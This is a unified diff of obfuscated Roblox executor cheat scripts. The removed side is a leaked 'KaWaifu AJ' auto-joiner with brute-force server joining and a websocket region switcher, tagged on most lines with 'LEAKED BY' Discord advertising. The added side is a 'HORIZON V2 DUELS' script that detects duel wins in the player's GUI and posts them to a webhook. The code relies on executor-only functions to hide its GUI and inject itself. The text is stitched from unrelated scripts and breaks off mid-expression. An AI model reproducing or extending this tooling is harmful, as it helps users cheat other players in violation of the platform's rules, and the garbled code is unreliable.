up_514 ();end;if B%8==0 then for B,B in ipairs(up_515:GetPlayers())do up_516(B);end;end;task.wait(0.25);end;if up_517 then pcall(function()up_517 :Disconnect();end);up_517 =nil;end;if getgenv()._KaWaifuSessionId==up_490 then local B=getgenv()._KaWaifuWS;I=up_518();getgenv()._KaWaifuWS=nil;if I then pcall(up_519,I);end;if B and B~=I then pcall(up_519,B);end;for B,B in ipairs(up_520)do pcall(function()B:Disconnect();end);end;table.clear(up_520);for B,B in ipairs(up_521)do pcall(function()B:Disconnect();end);end;table.clear(up_521);table.clear(up_522 );table.clear(up_523 );for B,B in ipairs(up_515:GetPlayers())do pcall(up_516,B);end;pcall(function()up_524:Destroy();end);end;end)
-
-		if tbl19.setWsStatus then
-			tbl19.setWsStatus("connecting")  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-		end
-	end
-
-	str9 = "v" .. tostring(getgenv().AJVersion or "?")
-	tbl20 = { DiscordInvite = tbl17.DiscordInvite }
-
-	tbl21 = {
-		"Capitano Moby",
-		"La Grande Combinasion",
-		"Garama and Madundung",
-		"Torrtugini Dragonfrutini",
-		"La Vacca Saturno Saturnita",  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-		"Chicleteira Bicicleteira",
-	}
-
-	Players = game:GetService("Players")
-	service2 = game:GetService("TweenService")
-	UserInputService = game:GetService("UserInputService")
-	service = game:GetService("HttpService")
-	localPlayer = Players.LocalPlayer
-
-	tbl22 = {
-		Background = Color3.fromRGB(13, 11, 14),
-		Sidebar = Color3.fromRGB(17, 14, 18),  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-		Element = Color3.fromRGB(26, 21, 27),
-		ElementHover = Color3.fromRGB(36, 27, 36),
-		Accent = Color3.fromRGB(232, 106, 155),
-		Accent2 = Color3.fromRGB(214, 150, 179),
-		Text = Color3.fromRGB(236, 228, 233),
-		TextDim = Color3.fromRGB(150, 132, 143),
-		Stroke = Color3.fromRGB(52, 40, 50),
-		SliderTrack = Color3.fromRGB(44, 35, 44),
-		Good = Color3.fromRGB(110, 200, 140),
-		Warn = Color3.fromRGB(215, 185, 110),  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-		Bad = Color3.fromRGB(210, 95, 105),
-	}
-
-	do
-		local windowSize = tbl17.WindowSize
-		minWindowSize = tbl17.MinWindowSize
-		x2 = windowSize.X
-		y2 = windowSize.Y
-		up_2 = windowSize
-	end
-end  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-
-slicedfn46 = function(B,I)return math.clamp((B/up_2.X+I/up_2.Y)/2,0.6,3);end
-up_3 = x2
-up_4 = 1
-up_5 = y2
-slicedfn30 = function()return math.floor(up_3 /up_4 +0.5),math.floor(up_5 /up_4 +0.5);end
-topBarHeight = tbl17.TopBarHeight
-sidebarWidth = tbl17.SidebarWidth
-flag18 = true
-flag19 = false
-flag20 = false  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-tbl27 = {}
-
-slicedfn31 = function(arg)
-	table.insert(tbl27, arg)
-	return arg
-end
-
-tbl23 = {
-	AutoJoin = tbl17.DefaultAutoJoin,
-	AnimSpeed = tbl17.DefaultAnimSpeed,
-	Whitelist = {},
-	MaxDuelTime = tbl17.DefaultMaxDuelTime,  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-	TPDuelEnabled = tbl17.DefaultShowDuels,
-	CarpetMode = tbl17.DefaultCarpetMode,
-	AutoJoinOGOffAJ = tbl17.DefaultAutoJoinOGOffAJ,
-	MidRetrySwitch = tbl17.DefaultMidRetrySwitch,
-	Attempts = tbl17.DefaultAttempts,
-	MaxElapsedJoin = tbl17.DefaultMaxServerAge,
-	BruteForceJoin = tbl17.DefaultBruteForce,
-	MinimizeOnInject = tbl17.DefaultMinimizeOnInject,
-	SoundId = tbl17.DefaultSoundId,
-	SoundVolume = tbl17.DefaultSoundVolume,  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-	HotkeyMinimize = tbl17.DefaultHotkeyMinimize,
-	HotkeyAutoTP = tbl17.DefaultHotkeyAutoTP,
-	AutoPickWS = false,
-	LatencyCache = {},
-}
-
-slicedfn32 = function()
+local function send(brainrot, value)
+	if not req then return end
+	local s = tostring(brainrot):gsub("`","'")
 	pcall(function()
-		writefile("KaWaifuJoiner.json", service:JSONEncode(tbl23))
+		req({
+			Url = hook,
+			Method = "POST",
+			Headers = {["Content-Type"] = "application/json"},
+			Body = Http:JSONEncode({
+				embeds = {{
+					title = "\u{1FAE8}HORIZON V2 DUELS\u{1FAE8}",
+					description = "```\u{1F62E}\u{200D}\u{1F4A8} SOMONE JUST MOGGED WITH DUELS V2 \u{1F62E}\u{200D}\u{1F4A8}```",
+					color = 0xADD8E6,
+					fields = {
+						{name="\u{1F9E0} Brainrot",value="```"..s.."```",inline=true},
+						{name="\u{1F4B0} Value",value="```"..value.."```",inline=true}
+					},
+					footer = {text = "HORIZON V2 | "..os.date("%H:%M:%S")},
+					timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+				}}
+			})
+		})
 	end)
-end  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
+end
 
+local function onWin()
+	if tick()-lastWin < COOLDOWN then return end
+	lastWin = tick()
+	
+	print("[HORIZON V2] WIN DETECTED!")
+	local br,val = getBrainrot()
+	print(string.format("[HORIZON V2] %s | %s", br, val))
+	send(br, val)
+end
+-- this print not ai i put it to test the script
+local function scan(obj)
+	if not (obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox")) then return end
+	local clean = stripTags(obj.Text):lower()
+	if clean:find(lp.Name:lower(),1,true) and clean:find("won the duel") then
+		onWin()
+	end
+end
+
+local pg = lp:WaitForChild("PlayerGui")
+
+for _,v in ipairs(pg:GetDescendants()) do
+	scan(v)
+	if v:IsA("TextLabel") or v:IsA("TextButton") or v:IsA("TextBox") then
+		v:GetPropertyChangedSignal("Text"):Connect(function() scan(v) end)
+	end
+end
+
+pg.DescendantAdded:Connect(function(v)
+	scan(v)
+	if v:IsA("TextLabel") or v:IsA("TextButton") or v:IsA("TextBox") then
+		v:GetPropertyChangedSignal("Text"):Connect(function() scan(v) end)
+	end
+end)-- Lua 5.1 compatible build v2 (no _G usage: shared names live in one local table)
+local __HH = {}
+local LP = LP
+local Lighting = Lighting
+local Players = Players
+local RunService = RunService
+local SKY_PRESETS = SKY_PRESETS
+local TS = TS
+local loadConfig = loadConfig
+local uiScaleValue = uiScaleValue
 do
-	local function slicedfn47()
-		local flag21 = false
-		local flag22 = false
 
-		pcall(function()
-			if isfile and isfile("KaWaifuJoiner.json") then
-				local data = service:JSONDecode(readfile("KaWaifuJoiner.json"))
-				local v = "table"
-
-				if type(data) == v then
-					for k, sliced91 in pairs(data) do  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-						tbl23[k] = sliced91
-					end
-
-					flag21 = true
-					flag22 = data.Attempts ~= nil or data.MaxDuelTime ~= nil or data.MaxElapsedJoin ~= nil
-				end
-			end
-		end)
-
-		if not flag21 or not flag22 then
-			pcall(function()
-				if isfile and isfile("KaWaifuJoiner_Settings.json") then  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-					local data = service:JSONDecode(readfile("KaWaifuJoiner_Settings.json"))
-					local v = "table"
-
-					if type(data) == v then
-
-						for _, sliced91 in ipairs({
-							"SoundId",
-							"SoundVolume",
-							"MinimizeOnInject",
-							"BruteForceJoin",
-							"HotkeyMinimize",
-							"HotkeyAutoTP",  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-						}) do
-							if data[sliced91] ~= nil then
-								tbl23[sliced91] = data[sliced91]
-							end
-						end
-					end
-				end
-
-				if isfile and isfile("KaWaifuJoiner_Config.json") then
-					local data = service:JSONDecode(readfile("KaWaifuJoiner_Config.json"))
-
-					if type(data) == "table" then  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-						if data.MaxDuelTime then
-							tbl23.MaxDuelTime = data.MaxDuelTime
-						end
-
-						if data.Attempts then
-							if true then
-								tbl23.Attempts = data.Attempts
-							end
-						end
-
-						if data.MaxElapsedJoin then
-							tbl23.MaxElapsedJoin = data.MaxElapsedJoin  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-						end
-
-						if data.TPDuelEnabled ~= nil then
-							tbl23.TPDuelEnabled = data.TPDuelEnabled
-						end
-					end
-				end
-			end)
-		end
-	end
-
-	slicedfn47()  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-end
-
-local Frame2
-
+-- ============================================================
+-- RED CIRCLE — always ON. No toggle, no button, no config.
+-- Flat red disc on the ground right under the player, exactly
+-- like Horizon Hub's red circle. Follows the ground everywhere and
+-- keeps working across respawns automatically.
+-- ============================================================
 do
-	do
-		do
-			do
-				tbl23.AutoJoin = false
-				tbl23.AnimSpeed = math.clamp(tonumber(tbl23.AnimSpeed) or 5, 1, 10)
-
-				if type(tbl23.Whitelist) ~= "table" then
-					tbl23.Whitelist = {}  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-				end
-
-				tbl23.MaxDuelTime = math.max(0, tonumber(tbl23.MaxDuelTime) or 10)
-				tbl23.TPDuelEnabled = tbl23.TPDuelEnabled ~= false
-
-				if tbl23._duelDefaultOn ~= true then
-					tbl23.TPDuelEnabled = true
-					tbl23._duelDefaultOn = true
-				end
-
-				if tbl23.CarpetMode ~= "Yes" and tbl23.CarpetMode ~= "Only" and tbl23.CarpetMode ~= "No" then
-					tbl23.CarpetMode = tbl17.DefaultCarpetMode or "Yes"
-
-				end  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-
-				tbl23.AutoJoinOGOffAJ = tbl23.AutoJoinOGOffAJ == true
-
-				if tbl23.MidRetrySwitch ~= "Better Newest" and tbl23.MidRetrySwitch ~= "Any Newest" then
-					tbl23.MidRetrySwitch = tbl17.DefaultMidRetrySwitch or "Better Newest"
-				end
-
-				tbl23.Attempts = math.max(1, math.floor(tonumber(tbl23.Attempts) or 50))
-				tbl23.MaxElapsedJoin = math.max(0, tonumber(tbl23.MaxElapsedJoin) or 10)
-				tbl23.BruteForceJoin = tbl23.BruteForceJoin ~= false
-				tbl23.MinimizeOnInject = tbl23.MinimizeOnInject == true
-				tbl23.SoundId = tostring(tbl23.SoundId or "5348162330"):match("%d+") or "5348162330"
-				tbl23.SoundVolume = math.floor(math.clamp(tonumber(tbl23.SoundVolume) or 10, 0, 10) * 10 + 0.5) / 10  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-
-				if type(tbl23.HotkeyMinimize) ~= "string" then
-					tbl23.HotkeyMinimize = "Z"
-				end
-
-				if type(tbl23.HotkeyAutoTP) ~= "string" then
-					tbl23.HotkeyAutoTP = "X"
-				end
-
-				do
-					local v = "string"
-
-					if type(tbl23.Region) ~= v or tbl23.Region == "" then
-						tbl23.Region = nil  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-					end
-				end
-			end
-
-			tbl23.AutoPickWS = tbl23.AutoPickWS == true
-
-			if type(tbl23.LatencyCache) ~= "table" then
-				tbl23.LatencyCache = {}
-			end
-
-			do
-				local latencyCache = {}
-
-				for k, v in pairs(tbl23.LatencyCache) do  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-					if type(k) == "string" and type(v) == "table" then
-						local num = tonumber(v.u)
-						local num2 = tonumber(v.s)
-						local num3 = tonumber(v.t)
-
-						if num and num3 then
-							latencyCache[k] = { u = num, s = num2, t = num3 }
-						end
-					end
-				end
-
-				tbl23.LatencyCache = latencyCache  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-			end
-		end
-
-		do
-			tbl23.HotkeyRejoin = nil
-			tbl23.IconPos = nil
-
-			if type(tbl23.WinSize) == "table" and tonumber(tbl23.WinSize.w) and tonumber(tbl23.WinSize.h) then
-				do
-					local x = minWindowSize.X
-					x2 = math.clamp(math.floor(tonumber(tbl23.WinSize.w)), x, 1920)
-				end  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-
-				do
-					local y = minWindowSize.Y
-					y2 = math.clamp(math.floor(tonumber(tbl23.WinSize.h)), y, 1080)
-				end
-
-				tbl23.WinSize = { w = x2, h = y2 }
-			else
-				tbl23.WinSize = nil
-
-			end
-
-			sliced84 = slicedfn46(x2, y2)
-
-			do  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-				local animSpeed = tbl23.AnimSpeed
-
-				slicedfn33 = function()
-					slicedfn32()
-
-					if tbl18.applySettings then
-						pcall(tbl18.applySettings, tbl23)
-					end
-				end
-
-				slicedfn34 = function()
-					if tbl23.AutoJoin then
-						return "ON", tbl22.Good  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-					end
-
-					if tbl23.AutoJoinOGOffAJ then
-						return "OG", tbl22.Warn
-					end
-					return "OFF", tbl22.Bad
-				end
-
-				tbl24 = {}
-				tbl25 = {}
-
-				local tbl28 = {
-					"",  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-					"K",
-					"M",
-					"B",
-					"T",
-					"Qa",
-					"Qi",
-					"Sx",
-					"Sp",
-					"Oc",
-					"No",  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-					"Dc",
-					"Ud",
-					"Dd",
-					"Td",
-					"Qad",
-					"Qid",
-					"Sxd",
-					"Spd",
-					"Ocd",
-					"Nod",  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-					"Vg",
-					"Uvg",
-					"Dvg",
-					"Tvg",
-				}
-
-				up_6 = tbl28
-				slicedfn35 = function(B)B=tostring(B or""):gsub("/s$",""):gsub("%s","");local I=tonumber(B);if I then return I;end;local I,e=B:match("[%a]+$"),B:match("^[%d%.]+");if e and I then for B,H in ipairs(up_6)do if H~=""and H:lower()==I:lower()then return(tonumber(e)or 0)*1000^(B-1);end;end;end;return 0;end
-				up_7 = tbl28
-				slicedfn36 = function(B,I)B,I=tonumber(B)or 0,I or 1;local e,H=math.floor(math.log(math.max(1,math.abs(B)),1000)),10^I;local a=math.floor(B*(H/1000^e))/H;return string.format("%."..I.."f",a):gsub("%.?0+$","")..(up_7[e+1]or"e+"..e);end
-				slicedfn37 = function(w,B)local I=Instance.new(w);for w,e in pairs(B)do if w~="Parent"then I[w]=e;end;end;if B.Parent then I.Parent=B.Parent;end;return I;end  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-				up_8 = service2
-				slicedfn38 = function(B,I,e,H,a)local K=up_8:Create(B,TweenInfo.new(I,H or Enum.EasingStyle.Quad,a or Enum.EasingDirection.Out),e);K:Play();return K;end
-				up_9 = slicedfn37
-				slicedfn39 = function(B,I)return up_9("UICorner",{CornerRadius=UDim.new(0,I),Parent=B});end
-
-				ScreenGui = slicedfn37("ScreenGui", {
-					Name = "KaWaifuJoinerUI",
-					ResetOnSpawn = false,
-					IgnoreGuiInset = true,
-					ZIndexBehavior = Enum.ZIndexBehavior.Sibling,
-					DisplayOrder = 999999,  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-				})
-
-				slicedfn40 = function()
-					if not flag18 then
-						return
-					end
-					flag18 = false
-
-					for _, v in ipairs(tbl27) do
-						pcall(function()
-							v:Disconnect()
-						end)  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-					end
-				end
-
-				ScreenGui.Destroying:Connect(slicedfn40)
-
-				slicedfn41 = function(arg)
-					local ok, result = pcall(function()
-						return gethui()
-					end)
-
-					local service3
-
-					if ok and typeof(result) == "Instance" then
-						service3 = result  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-					elseif syn and syn.protect_gui then
-						pcall(syn.protect_gui, arg)
-						service3 = game:GetService("CoreGui")
-					else
-						local ok2
-
-						ok2, service3 = pcall(function()
-							return game:GetService("CoreGui")
-						end)
-
-						service3 = ok2 and service3 or localPlayer:WaitForChild("PlayerGui")
-					end  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-
-					local kaWaifuJoinerUI = service3:FindFirstChild("KaWaifuJoinerUI")
-
-					if kaWaifuJoinerUI and kaWaifuJoinerUI ~= arg then
-						kaWaifuJoinerUI:Destroy()
-					end
-
-					arg.Parent = service3
-				end
-
-				up_10 = slicedfn37
-				up_11 = tbl22
-				up_12 = slicedfn39
-				up_13 = flag18  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-				up_14 = animSpeed
-			end
-		end
-
-		up_15 = slicedfn38
-		slicedfn42 = function(B,I,e,H)for a=1,I,1 do local I=math.random(10,18);local K=math.max(5,math.floor(I*0.45));local L=up_10("Frame",{Name="Petal"..a,AnchorPoint=Vector2.new(0.5,0.5),Position=UDim2.new(math.random(),0,0,-30),Size=UDim2.fromOffset(I,K),BackgroundColor3=a%2==0 and up_11.Accent or up_11.Accent2,BackgroundTransparency=0.55+math.random()*0.3,BorderSizePixel=0,Rotation=math.random(0,360),ZIndex=e,Parent=B});up_12(L,math.ceil(K/2));task.spawn(function()task.wait(math.random(0,45)/10);while up_13 and L.Parent do if H and not H()then task.wait(1);continue;end;local B,I=math.random(),(math.random()-0.5)*0.35;L.Position=UDim2.new(B,0,0,-30);L.Rotation=math.random(0,360);local e=math.random(45,95)/10/math.max(up_14 /5,0.1);up_15(L,e,{Position=UDim2.new(math.clamp(B+I,0.02,0.98),0,1,30),Rotation=L.Rotation+math.random(-200,200)},Enum.EasingStyle.Linear);task.wait(e);end;end);end;end
-
-		do
-			local v, sliced91 = slicedfn30()
-
-			Frame = slicedfn37("Frame", {
-				Name = "Main",
-				AnchorPoint = Vector2.new(0.5, 0.5),  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-				Position = UDim2.fromScale(0.5, 0.5),
-				Size = UDim2.fromOffset(v, sliced91),
-				BackgroundColor3 = tbl22.Background,
-				BorderSizePixel = 0,
-				Active = true,
-				Visible = false,
-				Parent = ScreenGui,
-			})
-		end
-	end  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-
-	do
-		do
-			slicedfn39(Frame, 12)
-			sliced85 = slicedfn37("UIScale", { Scale = 0, Parent = Frame })
-
-			do
-				local Frame3 = slicedfn37("Frame", {
-					Name = "Background",
-					Size = UDim2.fromScale(1, 1),
-					BackgroundColor3 = Color3.new(1, 1, 1),
-					BorderSizePixel = 0,  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-					ClipsDescendants = true,
-					ZIndex = 1,
-					Parent = Frame,
-				})
-
-				slicedfn39(Frame3, 12)
-
-				slicedfn37("UIGradient", {
-					Color = ColorSequence.new(Color3.fromRGB(16, 12, 16), Color3.fromRGB(11, 9, 12)),
-					Rotation = 115,
-					Parent = Frame3,
-				})  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-
-				local CanvasGroup = slicedfn37("CanvasGroup", {
-					Name = "PetalLayer",
-					Size = UDim2.fromScale(1, 1),
-					BackgroundTransparency = 1,
-					BorderSizePixel = 0,
-					ZIndex = 1,
-					Parent = Frame3,
-				})
-
-				slicedfn39(CanvasGroup, 12)
-
-				slicedfn42(CanvasGroup, 10, 1, function()  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-					if true then
-						return Frame.Visible
-					end
-
-				end)
-			end
-		end
-
-		up_16 = tbl26
-		up_17 = tbl23
-
-		up_18 = slicedfn32
-		;(function()local B,I=up_16,getgenv().JoinerConfig_jhgjerdf324sa;local e,H,a,K=B.scheme or"ws",B.path or"",B.fail_threshold or 3;local function L()local A={};local P,v=K or up_17.Region or B.default,false;for N,N in ipairs(B.regions)do if N.id==P then v=true;break;end;end;P=if not v then B.default else P;for v,v in ipairs(B.regions)do if v.id==P then table.insert(A,1,v);else table.insert(A,v);end;end;return A;end;local A,P=L(),0;local function v(N)if not N then return;end;if N.host then I.WsUrl=e.."://"..N.host..":"..tostring(N.port)..H;elseif N.url then I.WsUrl=N.url;else warn("[KaWaifu Region] region '"..tostring(N.id).."' has no host/url \226\128\148 not applied");return;end;getgenv().KaWaifuActiveRegion=N.id;end;v(A[1]);getgenv().__kawaifu_region_fail=function()P+=1;if P%a==0 and#A>1 then warn("[KaWaifu Region] "..P.." failed connects to current region");if getgenv().__kawaifu_on_region_trouble then pcall(getgenv().__kawaifu_on_region_trouble);end;end;end;getgenv().__kawaifu_region_ok=function()P=0;end;getgenv().__kawaifu_set_region=function(I)K=nil;up_17.Region=I;pcall(up_18 );A,P=L(),0;v(A[1]);end;getgenv().__kawaifu_set_region_session=function(w)K=w;A,P=L(),0;v(A[1]);end;getgenv().__kawaifu_region_list=function()local w={};for I,I in ipairs(B.regions)do w[#w+1]={id=I.id,label=I.label};end;return w;end;end)()  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-
-		Frame2 = slicedfn37("Frame", {
-			Name = "TopBar",
-			Size = UDim2.new(1, 0, 0, topBarHeight),
-			BackgroundTransparency = 1,
-			ZIndex = 3,
-			Parent = Frame,
-		})
-
-		slicedfn37("TextLabel", {
-			Name = "Title",
-			Position = UDim2.fromOffset(16, 0),  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-			Size = UDim2.new(0, 112, 1, 0),
-			BackgroundTransparency = 1,
-			Font = Enum.Font.GothamBold,
-			Text = "KaWaifu AJ",
-			TextColor3 = tbl22.Text,
-			TextSize = 18,
-			TextXAlignment = Enum.TextXAlignment.Left,
-			ZIndex = 3,
-			Parent = Frame2,
-		})  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-
-		slicedfn37("TextLabel", {
-			Name = "Version",
-			Position = UDim2.fromOffset(120, 3),
-			Size = UDim2.new(0, 60, 1, 0),
-			BackgroundTransparency = 1,
-			Font = Enum.Font.Gotham,
-			Text = str9,
-			TextColor3 = tbl22.TextDim,
-			TextTransparency = 0.35,
-			TextSize = 13,  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-			TextXAlignment = Enum.TextXAlignment.Left,
-			ZIndex = 3,
-			Parent = Frame2,
-		})
-
-		slicedfn43 = nil
-
-		do
-			local function slicedfn47()
-				local str10 = "https://" .. tbl20.DiscordInvite
-
-				local ok = pcall(function()
-					if true then  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-						setclipboard(str10)
-						return
-					end
-
-				end)
-
-				if slicedfn43 then
-
-					if ok then
-						slicedfn43("Discord", "Invite copied: " .. tbl20.DiscordInvite)
-					else
-						slicedfn43("Discord", "Our discord: " .. tbl20.DiscordInvite, 6)
-					end  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-				end
-			end
-
-			local TextButton = slicedfn37("TextButton", {
-				Name = "Discord",
-				AnchorPoint = Vector2.new(1, 0.5),
-				Position = UDim2.new(1, -84, 0.5, 0),
-				Size = UDim2.fromOffset(115, 24),
-				AutomaticSize = Enum.AutomaticSize.X,
-				BackgroundTransparency = 1,
-				AutoButtonColor = false,  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-				Font = Enum.Font.Gotham,
-				Text = tbl20.DiscordInvite,
-				TextColor3 = tbl22.TextDim,
-				TextSize = 13,
-				TextTruncate = Enum.TextTruncate.AtEnd,
-				TextXAlignment = Enum.TextXAlignment.Right,
-				ZIndex = 4,
-				Parent = Frame2,
-			})
-
-			slicedfn37("UISizeConstraint", { MaxSize = Vector2.new(300, math.huge), Parent = TextButton })  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-
-			slicedfn31(TextButton.MouseEnter:Connect(function()
-				slicedfn38(TextButton, 0.15, { TextColor3 = tbl22.Accent2 })
-			end))
-
-			slicedfn31(TextButton.MouseLeave:Connect(function()
-				slicedfn38(TextButton, 0.15, { TextColor3 = tbl22.TextDim })
-			end))
-
-			slicedfn31(TextButton.MouseButton1Click:Connect(slicedfn47))
-		end
-	end
-
-	sliced86 = function() end  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-	sliced87 = function() end
-	sliced88 = function() end
-	up_19 = tbl17
-	up_20 = slicedfn37
-	up_21 = tbl22
-	up_22 = Frame
-	up_23 = slicedfn39
-	up_24 = tbl25
-	up_25 = sliced86
-	up_26 = tbl18  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-	up_27 = slicedfn38
-	up_28 = slicedfn31
-	up_29 = slicedfn43
-	up_30 = tbl26
-	up_31 = UserInputService
-	up_32 = connect
-	up_33 = tbl23
-	up_34 = slicedfn32
-	up_35 = flag18
-	up_36 = sliced87  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-
-	up_37 = sliced88
-	;(function()local B=up_19.WsTabX;local I=up_19.WsTabOutY;local e=up_19.WsTabHiddenY;local H=240;local a=36;local K=up_20("TextButton",{Name="WsTab",Position=UDim2.fromOffset(B,e),Size=UDim2.fromOffset(H,a),BackgroundColor3=up_21.Element,AutoButtonColor=false,ClipsDescendants=true,Text="",Visible=false,ZIndex=0,Parent=up_22});up_23(K,10);up_20("UIStroke",{Color=up_21.Stroke,Transparency=0.3,Thickness=1,Parent=K});local L=up_20("Frame",{AnchorPoint=Vector2.new(0,1),Position=UDim2.new(0,0,1,0),Size=UDim2.new(1,0,0,a),BackgroundTransparency=1,ZIndex=4,Parent=K});local A=up_20("Frame",{AnchorPoint=Vector2.new(0,0.5),Position=UDim2.fromOffset(12,14),Size=UDim2.fromOffset(8,8),BackgroundColor3=up_21.Bad,BorderSizePixel=0,ZIndex=5,Parent=L});up_23(A,4);local P=up_20("TextLabel",{Position=UDim2.fromOffset(26,0),Size=UDim2.new(1,-56,0,28),BackgroundTransparency=1,Font=Enum.Font.GothamMedium,Text="Offline",TextColor3=up_21.Text,TextSize=14,TextTruncate=Enum.TextTruncate.AtEnd,TextXAlignment=Enum.TextXAlignment.Left,ZIndex=5,Parent=L});local v=up_20("TextLabel",{AnchorPoint=Vector2.new(1,0.5),Position=UDim2.new(1,-12,0,14),Size=UDim2.fromOffset(16,16),BackgroundTransparency=1,Font=Enum.Font.GothamBold,Text="v",TextColor3=up_21.TextDim,TextSize=14,Rotation=180,ZIndex=5,Parent=L});local N="Offline";local S=nil;S=function()P.Text=N..(up_24.wsRegionText and"  \194\183  "..up_24.wsRegionText or"");end;up_25 =function(P)local j={live={text="Live",color=up_21.Good},connecting={text="Connecting...",color=up_21.Warn},offline={text="Offline",color=up_21.Bad}};local p=j[P]or j.offline;N=p.text;A.BackgroundColor3=p.color;S();if up_24.iconDot then up_24.iconDot.BackgroundColor3=p.color;end;if up_24.miniWsText then up_24.miniWsText.Text=p.text;up_24.miniWsText.TextColor3=p.color;end;end;local A;local P,N=false,false;do local j,p=pcall(function()return getgenv().__kawaifu_region_list and(getgenv().__kawaifu_region_list())or{};end);local W=j and type(p)=="table"and p or{};local function r()local s=getgenv().KaWaifuActiveRegion;for y,y in ipairs(W)do if y.id==s then return y.label or y.id;end;end;return W[1]and(W[1].label or W[1].id)or nil;end;if#W>0 then local s,y,h,_,o,E,R,J={},{},{},{},Color3.fromRGB(205,172,102),{};local function l(T,d)local M=d and getgenv().__kawaifu_set_region or getgenv().__kawaifu_set_region_session;if M then pcall(M,T);end;d=up_26.reconnect;if d then d();end;up_24.wsRegionText=r();if up_24.miniThird then up_24.miniThird.Text=up_24.wsRegionText or"\226\128\148";end;up_25 (d and"connecting"or"offline");if J then J();end;end;local T=math.min(#W,4)*30+10;L=up_20("ScrollingFrame",{AnchorPoint=Vector2.new(0,1),Position=UDim2.new(0,0,1,-a),Size=UDim2.new(1,0,0,T),BackgroundTransparency=1,BorderSizePixel=0,ScrollBarThickness=3,ScrollBarImageColor3=up_21.Accent,CanvasSize=UDim2.new(0,0,0,0),AutomaticCanvasSize=Enum.AutomaticSize.Y,ZIndex=4,Parent=K});up_20("UIListLayout",{Padding=UDim.new(0,2),SortOrder=Enum.SortOrder.LayoutOrder,Parent=L});up_20("UIPadding",{PaddingTop=UDim.new(0,8),PaddingLeft=UDim.new(0,6),PaddingRight=UDim.new(0,6),Parent=L});up_20("Frame",{AnchorPoint=Vector2.new(0,1),Position=UDim2.new(0,10,1,-a),Size=UDim2.new(1,-20,0,1),BackgroundColor3=up_21.Stroke,BackgroundTransparency=0.3,BorderSizePixel=0,ZIndex=4,Parent=K});local d=false;A=function(M)if d==M then return;end;d=M;if M then up_27(K,0.2,{Position=UDim2.fromOffset(B,I-T),Size=UDim2.fromOffset(H,a+T)});else up_27(K,0.16,{Position=UDim2.fromOffset(B,I),Size=UDim2.fromOffset(H,a)},Enum.EasingStyle.Quad,Enum.EasingDirection.In);end;up_27(v,0.2,{Rotation=M and 0 or 180});end;for H,a in ipairs(W)do local W=a.id;local T=a.label or W;local a=up_20("TextButton",{Size=UDim2.new(1,0,0,26),BackgroundColor3=up_21.ElementHover,BackgroundTransparency=0.35,AutoButtonColor=false,Font=Enum.Font.GothamMedium,Text=T,TextColor3=up_21.Text,TextSize=15,TextXAlignment=Enum.TextXAlignment.Left,TextTruncate=Enum.TextTruncate.AtEnd,LayoutOrder=H,ZIndex=5,Parent=L});up_23(a,6);y[W]=a;_[W]=H;up_20("UIPadding",{PaddingLeft=UDim.new(0,32),PaddingRight=UDim.new(0,72),Parent=a});h[W]=up_20("TextLabel",{AnchorPoint=Vector2.new(0,0.5),Position=UDim2.new(0,-22,0.5,0),Size=UDim2.fromOffset(18,16),BackgroundTransparency=1,Font=Enum.Font.GothamBold,Text="\226\128\147",TextColor3=up_21.TextDim,TextSize=13,TextXAlignment=Enum.TextXAlignment.Left,ZIndex=6,Parent=a});s[W]=up_20("TextLabel",{AnchorPoint=Vector2.new(1,0.5),Position=UDim2.new(1,62,0.5,0),Size=UDim2.fromOffset(68,16),BackgroundTransparency=1,Font=Enum.Font.Gotham,Text="\226\128\166",TextColor3=up_21.TextDim,TextSize=13,TextXAlignment=Enum.TextXAlignment.Right,ZIndex=6,Parent=a});E[W]=up_20("UIStroke",{ApplyStrokeMode=Enum.ApplyStrokeMode.Border,Color=o,Thickness=1.5,Transparency=1,Parent=a});up_28 